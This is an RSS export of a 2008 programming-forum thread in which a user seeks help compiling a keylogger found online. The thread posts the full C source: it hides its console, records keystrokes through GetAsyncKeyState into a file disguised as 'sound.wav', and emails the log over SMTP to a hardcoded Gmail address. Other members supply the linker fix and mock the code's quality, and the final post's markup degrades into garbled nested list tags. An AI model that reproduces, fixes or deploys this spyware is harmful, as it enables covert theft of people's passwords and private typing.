<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>C/C++ Problem</title>
    <link>https://forum.moparisthebest.com/t/c-c-problem/202399</link>
    <description>Hi, I found this program on the internet but when I compile it with Dev C++ 4.9.9.2 I get these errors in the compile box:

[code]Compiler: Default compiler
Executing  g++.exe...
g++.exe &quot;\\.PSF\.Home\Desktop\Folder Lock(for Sen)\Keylogger-1.cpp&quot; -o &quot;\\.PSF\.Home\Desktop\Folder Lock(for Sen)\Keylogger-1.exe&quot;    -I&quot;C:\Dev-Cpp\lib\gcc\mingw32\3.4.2\include&quot;  -I&quot;C:\Dev-Cpp\include\c++\3.4.2\backward&quot;  -I&quot;C:\Dev-Cpp\include\c++\3.4.2\mingw32&quot;  -I&quot;C:\Dev-Cpp\include\c++\3.4.2&quot;  -I&quot;C:\Dev-Cpp\include&quot;   -L&quot;C:\Dev-Cpp\lib&quot; 
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x733):Keylogger-1.cpp: undefined reference to `WSAStartup@8&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x756):Keylogger-1.cpp: undefined reference to `WSACleanup@0&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x770):Keylogger-1.cpp: undefined reference to `gethostbyname@4&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x803):Keylogger-1.cpp: undefined reference to `htons@4&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x829):Keylogger-1.cpp: undefined reference to `socket@12&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x862):Keylogger-1.cpp: undefined reference to `connect@12&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x8b6):Keylogger-1.cpp: undefined reference to `recv@16&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x943):Keylogger-1.cpp: undefined reference to `send@16&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x980):Keylogger-1.cpp: undefined reference to `recv@16&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xa4f):Keylogger-1.cpp: undefined reference to `send@16&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xa8c):Keylogger-1.cpp: undefined reference to `recv@16&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xb5b):Keylogger-1.cpp: undefined reference to `send@16&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xb98):Keylogger-1.cpp: undefined reference to `recv@16&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xc25):Keylogger-1.cpp: undefined reference to `send@16&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xc62):Keylogger-1.cpp: undefined reference to `recv@16&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xdd6):Keylogger-1.cpp: undefined reference to `send@16&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xe13):Keylogger-1.cpp: undefined reference to `recv@16&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xea0):Keylogger-1.cpp: undefined reference to `send@16&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xedd):Keylogger-1.cpp: undefined reference to `recv@16&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xf26):Keylogger-1.cpp: undefined reference to `closesocket@4&#39;
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xf2e):Keylogger-1.cpp: undefined reference to `WSACleanup@0&#39;
collect2: ld returned 1 exit status

Execution terminated[/code]

Any ideas? The actual code that I am using is:

[code]/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
*                                                                              *
*  File: keymail.c   Ver. 0.7                                                  *
*                                                                              *
*  Purpose: a stealth (somewhat) key logger, writes to a log file then sends   *
*  and email to whoever is set in the #define options at compile time.         *
*  This code is for educational uses, don&#39;t be an ass hat with it.             *
*  White Scorpion (www.white-scorpion.nl) did the initial work on the key      *
*  logger, but he has gone on to bigger and better things.                     *
*  This version was crafted by Irongeek (www.Irongeek.com), who tacked on      *
*  some code to make it send emails, along with a few other changes.           *
*  If some of the code is crappy, blame Irongeek and not White Scorpion.       *
*  Please send Irongeek improvements and he will post the changes and give you *
*  credit for your contributions.                                              *
*                                                                              *
*  This program is free software; you can redistribute it and/or               *
*  modify it under the terms of the GNU General Public License                 *
*  as published by the Free Software Foundation; either version 2              *
*  of the License, or (at your option) any later version.                      *
*                                                                              *
*  This program is distributed in the hope that it will be useful,             *
*  but WITHOUT ANY WARRANTY; without even the implied warranty of              *
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the               *
*  GNU General Public License for more details.                                *
*                                                                              *
*  You should have received a copy of the GNU General Public License           *
*  along with this program; if not, write to the Free Software                 *
*  Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. *
*                                                                              *
* Change log:                                                                  *
*      1/3/06 On Ed Rguyl&#39;s recommendation I changed how malloc was used.      *
*      6/22/06 Added the date and time functionality using ctime and fixed     *
*              a bug where subject was being defined twice.(ThVoidedLine)      *
*                                                                              *
* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
/*
Compile notes: I used Dev-C++ 4.9.9.2 to compie this. if you get an error like:
        Linker error] undefined reference to `WSAStartup@8&#39;
Add this:
         -lws2_32
to Tools-&gt;Compiler Options under the section on compile flags.
*/

#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;winuser.h&gt;
#include &lt;windowsx.h&gt;
#include &lt;time.h&gt;
int MailIt (char *mailserver, char *emailto, char *emailfrom, 
char *emailsubject, char *emailmessage);
#define BUFSIZE 800
#define waittime 500
/*If you don&#39;t know the mail exchange server for an address for the following 
&quot;nslookup -querytype=mx gmail.com&quot; but replace gmail.com with the domain for 
whatever email address you want. YOU MUST CHANGE  THESE SETTINGS OR
IT WILL NOT WORK!!! */
#define cmailserver &quot;gmail-smtp-in.l.google.com&quot;
#define cemailto &quot;logsen10@gmail.com&quot;
#define cemailfrom &quot;logsen10@gmail.com&quot;
#define LogLength 100
#define FileName &quot;sound.wav&quot;
#define SMTPLog &quot;ring.wav&quot;
#define cemailsubject &quot;Logged&quot;

int get_keys(void);
int test_key(void);
int main(void)
{
   //Uncomment the lines below to put the keylogger in stealh mode.
   HWND stealth; /*creating stealth */
   AllocConsole();
   stealth=FindWindowA(&quot;ConsoleWindowClass&quot;,NULL);
   ShowWindow(stealth,0);
   
   {FILE *file;
   file=fopen(FileName,&quot;a+&quot;);
   time_t theTime=time(0);
   fputs(&quot;\nStarted logging: &quot;, file);
   fputs(ctime(&amp;theTime),file);
   fclose(file);
   }
   
   /* if (test==2)
    {//the path in which the file needs to be
    char *path=&quot;c:\\%windir%\\svchost.exe&quot;;
    create=create_key(path);          
    } */
   
   int t=get_keys();    
   return t;
}  

int get_keys(void)
{
int freadindex;
char *buf;
long len;
FILE *file;
file=fopen(FileName,&quot;a+&quot;);


           short character;
             while(1)
             {
                    Sleep(10);/*to prevent 100% cpu usage*/
                    for(character=8;character&lt;=222;character++)
                    {
                        if(GetAsyncKeyState(character)==-32767)
                        {  
                            FILE *file;
                            file=fopen(FileName,&quot;a+&quot;);
                            if(file==NULL)
                            {
                                    return 1;
                            }            
                            if(file!=NULL)
                            {        
                                    if((character&gt;=39)&amp;&amp;(character&lt;=64))
                                    {
                                          fputc(character,file);
                                          fclose(file);
                                          break;
                                    }        
                                    else if((character&gt;64)&amp;&amp;(character&lt;91))
                                    {
                                          character+=32;
                                          fputc(character,file);
                                          fclose(file);
                                          break;
                                    }
                                    else
                                    {
                                        switch(character)
                                        {
                                              case VK_SPACE:
                                              fputc(&#39; &#39;,file);
                                              fclose(file);
                                              break;    
                                              case VK_SHIFT:
                                              fputs(&quot;\r\n[SHIFT]\r\n&quot;,file);
                                              fclose(file);
                                              break;                                            
                                              case VK_RETURN:
                                              fputs(&quot;\r\n[ENTER]\r\n&quot;,file);
                                              fclose(file);
                                              break;
                                              case VK_BACK:
                                              fputs(&quot;\r\n[BACKSPACE]\r\n&quot;,file);
                                              fclose(file);
                                              break;
                                              case VK_TAB:
                                              fputs(&quot;\r\n[TAB]\r\n&quot;,file);
                                              fclose(file);
                                              break;
                                              case VK_CONTROL:
                                              fputs(&quot;\r\n[CTRL]\r\n&quot;,file);
                                              fclose(file);
                                              break;    
                                              case VK_DELETE:
                                              fputs(&quot;\r\n[DEL]\r\n&quot;,file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_1:
                                              fputs(&quot;\r\n[;:]\r\n&quot;,file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_2:
                                              fputs(&quot;\r\n[/?]\r\n&quot;,file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_3:
                                              fputs(&quot;\r\n[`~]\r\n&quot;,file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_4:
                                              fputs(&quot;\r\n[ [{ ]\r\n&quot;,file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_5:
                                              fputs(&quot;\r\n[\\|]\r\n&quot;,file);
                                              fclose(file);

[/code]

Continued next post.</description>
    
    <lastBuildDate>Fri, 09 May 2008 05:47:56 +0000</lastBuildDate>
    <category>General Programming</category>
    <atom:link href="https://forum.moparisthebest.com/t/c-c-problem/202399.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>C/C++ Problem</title>
        <dc:creator><![CDATA[@Sensored3 Sensored3]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/sensored3">@Sensored3</a> wrote:</p>
          <blockquote>
              <p>By the way, such a GetAsyncKeyState() based keylogger is detected by nearly every kind of AV out there.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-c-problem/202399/10">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-c-problem/202399/10</link>
        <pubDate>Fri, 09 May 2008 05:47:56 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-202399-10</guid>
        <source url="https://forum.moparisthebest.com/t/c-c-problem/202399.rss">C/C++ Problem</source>
      </item>
      <item>
        <title>C/C++ Problem</title>
        <dc:creator><![CDATA[@Mopman Mopman]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/mopman">@Mopman</a> wrote:</p>
          <blockquote>
              <p>You should have used ws2_32.lib, I’m not sure if that is causing your error.</p>
<p>It actually says this in the comments at the top of the code, even, if you’d even skim read it.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-c-problem/202399/9">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-c-problem/202399/9</link>
        <pubDate>Tue, 29 Apr 2008 22:19:13 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-202399-9</guid>
        <source url="https://forum.moparisthebest.com/t/c-c-problem/202399.rss">C/C++ Problem</source>
      </item>
      <item>
        <title>C/C++ Problem</title>
        <dc:creator><![CDATA[@Jellybean732 Jellybean732]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/jellybean732">@Jellybean732</a> wrote:</p>
          <blockquote>
              <p>Now it says ‘close’ is undefined???</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-c-problem/202399/8">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-c-problem/202399/8</link>
        <pubDate>Tue, 29 Apr 2008 20:17:00 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-202399-8</guid>
        <source url="https://forum.moparisthebest.com/t/c-c-problem/202399.rss">C/C++ Problem</source>
      </item>
      <item>
        <title>C/C++ Problem</title>
        <dc:creator><![CDATA[@bakatool bakatool]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/bakatool">@bakatool</a> wrote:</p>
          <blockquote>
              <p>haha btw duplicate this guy is a scar coder and did some javascripts for RS2 including commands<br>
<a href="http://www.dreamincode.net/forums/showtopic23047.htm" class="onebox" target="_blank" rel="nofollow noopener">http://www.dreamincode.net/forums/showtopic23047.htm</a></p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-c-problem/202399/7">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-c-problem/202399/7</link>
        <pubDate>Tue, 29 Apr 2008 14:09:54 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-202399-7</guid>
        <source url="https://forum.moparisthebest.com/t/c-c-problem/202399.rss">C/C++ Problem</source>
      </item>
      <item>
        <title>C/C++ Problem</title>
        <dc:creator><![CDATA[@zstars zstars]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/zstars">@zstars</a> wrote:</p>
          <blockquote>
              <p>It’s C, not C++. And apart from being horrible, I don’t think it is even complete <img src="https://forum.moparisthebest.com/images/emoji/twitter/slight_smile.png?v=6" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-c-problem/202399/6">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-c-problem/202399/6</link>
        <pubDate>Tue, 29 Apr 2008 13:32:49 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-202399-6</guid>
        <source url="https://forum.moparisthebest.com/t/c-c-problem/202399.rss">C/C++ Problem</source>
      </item>
      <item>
        <title>C/C++ Problem</title>
        <dc:creator><![CDATA[@Jellybean732 Jellybean732]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/jellybean732">@Jellybean732</a> wrote:</p>
          <blockquote>
              <p>kk thnx</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-c-problem/202399/5">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-c-problem/202399/5</link>
        <pubDate>Tue, 29 Apr 2008 00:14:02 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-202399-5</guid>
        <source url="https://forum.moparisthebest.com/t/c-c-problem/202399.rss">C/C++ Problem</source>
      </item>
      <item>
        <title>C/C++ Problem</title>
        <dc:creator><![CDATA[@I_Flame_Moparscapers I Flame Moparscapers]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/i_flame_moparscapers">@I_Flame_Moparscapers</a> wrote:</p>
          <blockquote>
              <p><span class="hashtag">#pragma</span> comment(lib, “wsock32.lib”)</p>
<p>also, horrible keylogger.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-c-problem/202399/4">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-c-problem/202399/4</link>
        <pubDate>Tue, 29 Apr 2008 00:01:20 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-202399-4</guid>
        <source url="https://forum.moparisthebest.com/t/c-c-problem/202399.rss">C/C++ Problem</source>
      </item>
      <item>
        <title>C/C++ Problem</title>
        <dc:creator><![CDATA[@T_76 T_76]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/t_76">@T_76</a> wrote:</p>
          <blockquote>
              <p>What are you using this for?</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-c-problem/202399/3">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-c-problem/202399/3</link>
        <pubDate>Mon, 28 Apr 2008 23:45:28 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-202399-3</guid>
        <source url="https://forum.moparisthebest.com/t/c-c-problem/202399.rss">C/C++ Problem</source>
      </item>
      <item>
        <title>C/C++ Problem</title>
        <dc:creator><![CDATA[@Jellybean732 Jellybean732]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/jellybean732">@Jellybean732</a> wrote:</p>
          <blockquote>
              <p>[code]                                              break;<br>
case VK_OEM_6:<br>
fputs("\r\n[ ]} ]\r\n",file);<br>
fclose(file);<br>
break;<br>
case VK_OEM_7:<br>
fputs("\r\n[’"]\r\n",file);<br>
fclose(file);<br>
break;<br>
case 187:<br>
fputc(’+’,file);<br>
fclose(file);<br>
break;<br>
case 188:<br>
fputc(’,’,file);<br>
fclose(file);<br>
break;<br>
case 189:<br>
fputc(’-’,file);<br>
fclose(file);<br>
break;<br>
case 190:<br>
fputc(’.’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD0:<br>
fputc(‘0’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD1:<br>
fputc(‘1’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD2:<br>
fputc(‘2’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD3:<br>
fputc(‘3’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD4:<br>
fputc(‘4’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD5:<br>
fputc(‘5’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD6:<br>
fputc(‘6’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD7:<br>
fputc(‘7’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD8:<br>
fputc(‘8’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD9:<br>
fputc(‘9’,file);<br>
fclose(file);<br>
break;<br>
case VK_CAPITAL:<br>
fputs("\r\n[CAPS LOCK]\r\n",file);<br>
fclose(file);<br>
break;<br>
default:<br>
fclose(file);<br>
break;<br>
}<br>
}<br>
}<br>
}<br>
}<br>
FILE *file;<br>
file=fopen(FileName,“rb”);<br>
fseek(file,0,SEEK_END); //go to end<br>
len=ftell(file); //get position at end (length)<br>
if(len&gt;=LogLength) {<br>
fseek(file,0,SEEK_SET);//go to beg.<br>
buf=(char *)malloc(len);//malloc buffer<br>
freadindex=fread(buf,1,len,file);//read into buffer<br>
buf[freadindex] = ‘\0’;//Extra bit I have to add to make it a sting<br>
MailIt( cmailserver, cemailto, cemailfrom, cemailsubject, buf);<br>
fclose(file);<br>
file=fopen(FileName,“w”);<br>
}</p>
<pre><code>        fclose(file);
        //free (buf);
             
       }
       return EXIT_SUCCESS;                            
</code></pre>
<p>}</p>
<p>int MailIt (char *mailserver, char *emailto, char *emailfrom,<br>
char *emailsubject, char *emailmessage) {<br>
SOCKET sockfd;<br>
WSADATA wsaData;<br>
FILE *smtpfile;</p>
<pre><code>#define bufsize 300
int bytes_sent;   /* Sock FD */
int err;
struct hostent *host;   /* info from gethostbyname */
struct sockaddr_in dest_addr;   /* Host Address */
char line[1000];
char *Rec_Buf = (char*) malloc(bufsize+1);
smtpfile=fopen(SMTPLog,"a+");
if (WSAStartup(0x202,&amp;wsaData) == SOCKET_ERROR) {
  fputs("WSAStartup failed",smtpfile);
  WSACleanup();
  return -1;
}
if ( (host=gethostbyname(mailserver)) == NULL) {
   perror("gethostbyname");
   exit(1);
}
memset(&amp;dest_addr,0,sizeof(dest_addr));
memcpy(&amp;(dest_addr.sin_addr),host-&gt;h_addr,host-&gt;h_length);

 /* Prepare dest_addr */
 dest_addr.sin_family= host-&gt;h_addrtype;  /* AF_INET from gethostbyname */
 dest_addr.sin_port= htons(25); /* PORT defined above */

 /* Get socket */

 if ((sockfd=socket(AF_INET,SOCK_STREAM,0)) &lt; 0) {
    perror("socket");
    exit(1);
    }
 /* Connect !*/
 fputs("Connecting....\n",smtpfile);

if (connect(sockfd, (struct sockaddr *)&amp;dest_addr,sizeof(dest_addr)) == -1){
    perror("connect");
    exit(1);
    }
 Sleep(waittime);
 err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
 fputs(Rec_Buf,smtpfile);
 strcpy(line,"helo me.somepalace.com\n");
 fputs(line,smtpfile);
 bytes_sent=send(sockfd,line,strlen(line),0);
 Sleep(waittime);
 err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
 fputs(Rec_Buf,smtpfile);
 strcpy(line,"MAIL FROM:&lt;");
 strncat(line,emailfrom,strlen(emailfrom));
 strncat(line,"&gt;\n",3);
 fputs(line,smtpfile);
 bytes_sent=send(sockfd,line,strlen(line),0);
 Sleep(waittime);
 err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
 fputs(Rec_Buf,smtpfile);
 strcpy(line,"RCPT TO:&lt;");
 strncat(line,emailto,strlen(emailto));
 strncat(line,"&gt;\n",3);
 fputs(line,smtpfile);
 bytes_sent=send(sockfd,line,strlen(line),0);
 Sleep(waittime);
 err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
 fputs(Rec_Buf,smtpfile);
 strcpy(line,"DATA\n");
 fputs(line,smtpfile);
 bytes_sent=send(sockfd,line,strlen(line),0);
 Sleep(waittime);
 err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
 fputs(Rec_Buf,smtpfile);
 Sleep(waittime);
 strcpy(line,"To:");
 strcat(line,emailto);
 strcat(line,"\n");
 strcat(line,"From:");
 strcat(line,emailfrom);
 strcat(line,"\n");
 strcat(line,"Subject:");
 strcat(line,emailsubject);
 strcat(line,"\n");
 strcat(line,emailmessage);
 strcat(line,"\r\n.\r\n");
 fputs(line,smtpfile);
 bytes_sent=send(sockfd,line,strlen(line),0);
 Sleep(waittime);
 err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
 fputs(Rec_Buf,smtpfile);
 strcpy(line,"quit\n");
 fputs(line,smtpfile);
 bytes_sent=send(sockfd,line,strlen(line),0);
 Sleep(waittime);
 err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
 fputs(Rec_Buf,smtpfile);
 fclose(smtpfile);                          
 #ifdef WIN32
 closesocket(sockfd);
 WSACleanup();
 #else
 close(sockfd);
 #endif
</code></pre>
<p>}[/code]</p>
<p>Please post if you can help me.</p>
<p>Thanks</p>
<p>Jellybean732</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-c-problem/202399/2">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-c-problem/202399/2</link>
        <pubDate>Mon, 28 Apr 2008 20:51:14 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-202399-2</guid>
        <source url="https://forum.moparisthebest.com/t/c-c-problem/202399.rss">C/C++ Problem</source>
      </item>
      <item>
        <title>C/C++ Problem</title>
        <dc:creator><![CDATA[@Jellybean732 Jellybean732]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/jellybean732">@Jellybean732</a> wrote:</p>
          <blockquote>
              <p>Hi, I found this program on the internet but when I compile it with Dev C++ 4.9.9.2 I get these errors in the compile box:</p>
<p>[code]Compiler: Default compiler<br>
Executing  g++.exe…<br>
g++.exe “\.PSF.Home\Desktop\Folder Lock(for Sen)\Keylogger-1.cpp” -o “\.PSF.Home\Desktop\Folder Lock(for Sen)\Keylogger-1.exe”    -I"C:\Dev-Cpp\lib\gcc\mingw32\3.4.2\include"  -I"C:\Dev-Cpp\include\c++\3.4.2\backward"  -I"C:\Dev-Cpp\include\c++\3.4.2\mingw32"  -I"C:\Dev-Cpp\include\c++\3.4.2"  -I"C:\Dev-Cpp\include"   -L"C:\Dev-Cpp\lib"<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x733):Keylogger-1.cpp: undefined reference to <code>WSAStartup@8' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x756):Keylogger-1.cpp: undefined reference to</code>WSACleanup@0’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x770):Keylogger-1.cpp: undefined reference to <code>gethostbyname@4' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x803):Keylogger-1.cpp: undefined reference to</code>htons@4’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x829):Keylogger-1.cpp: undefined reference to <code>socket@12' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x862):Keylogger-1.cpp: undefined reference to</code>connect@12’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x8b6):Keylogger-1.cpp: undefined reference to <code>recv@16' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x943):Keylogger-1.cpp: undefined reference to</code>send@16’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x980):Keylogger-1.cpp: undefined reference to <code>recv@16' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xa4f):Keylogger-1.cpp: undefined reference to</code>send@16’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xa8c):Keylogger-1.cpp: undefined reference to <code>recv@16' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xb5b):Keylogger-1.cpp: undefined reference to</code>send@16’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xb98):Keylogger-1.cpp: undefined reference to <code>recv@16' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xc25):Keylogger-1.cpp: undefined reference to</code>send@16’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xc62):Keylogger-1.cpp: undefined reference to <code>recv@16' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xdd6):Keylogger-1.cpp: undefined reference to</code>send@16’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xe13):Keylogger-1.cpp: undefined reference to <code>recv@16' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xea0):Keylogger-1.cpp: undefined reference to</code>send@16’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xedd):Keylogger-1.cpp: undefined reference to <code>recv@16' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xf26):Keylogger-1.cpp: undefined reference to</code>closesocket@4’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xf2e):Keylogger-1.cpp: undefined reference to `WSACleanup@0’<br>
collect2: ld returned 1 exit status</p>
<p>Execution terminated[/code]</p>
<p>Any ideas? The actual code that I am using is:</p>
<p>[code]/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *</p>
<ul>
<li>
<pre><code>                                                                         *
</code></pre>
</li>
<li>File: keymail.c   Ver. 0.7                                                  *</li>
<li>
<pre><code>                                                                         *
</code></pre>
</li>
<li>Purpose: a stealth (somewhat) key logger, writes to a log file then sends   *</li>
<li>and email to whoever is set in the <span class="hashtag">#define</span> options at compile time.         *</li>
<li>This code is for educational uses, don’t be an ass hat with it.             *</li>
<li>White Scorpion (www.white-scorpion.nl) did the initial work on the key      *</li>
<li>logger, but he has gone on to bigger and better things.                     *</li>
<li>This version was crafted by Irongeek (<a href="http://www.Irongeek.com" rel="nofollow noopener">www.Irongeek.com</a>), who tacked on      *</li>
<li>some code to make it send emails, along with a few other changes.           *</li>
<li>If some of the code is crappy, blame Irongeek and not White Scorpion.       *</li>
<li>Please send Irongeek improvements and he will post the changes and give you *</li>
<li>credit for your contributions.                                              *</li>
<li>
<pre><code>                                                                         *
</code></pre>
</li>
<li>This program is free software; you can redistribute it and/or               *</li>
<li>modify it under the terms of the GNU General Public License                 *</li>
<li>as published by the Free Software Foundation; either version 2              *</li>
<li>of the License, or (at your option) any later version.                      *</li>
<li>
<pre><code>                                                                         *
</code></pre>
</li>
<li>This program is distributed in the hope that it will be useful,             *</li>
<li>but WITHOUT ANY WARRANTY; without even the implied warranty of              *</li>
<li>MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the               *</li>
<li>GNU General Public License for more details.                                *</li>
<li>
<pre><code>                                                                         *
</code></pre>
</li>
<li>You should have received a copy of the GNU General Public License           *</li>
<li>along with this program; if not, write to the Free Software                 *</li>
<li>Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. *</li>
<li>
<pre><code>                                                                         *
</code></pre>
</li>
<li>Change log:                                                                  *</li>
<li>
<pre><code> 1/3/06 On Ed Rguyl's recommendation I changed how malloc was used.      *
</code></pre>
</li>
<li>
<pre><code> 6/22/06 Added the date and time functionality using ctime and fixed     *
</code></pre>
</li>
<li>
<pre><code>         a bug where subject was being defined twice.(ThVoidedLine)      *
</code></pre>
</li>
<li>
<pre><code>                                                                         *
</code></pre>
</li>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
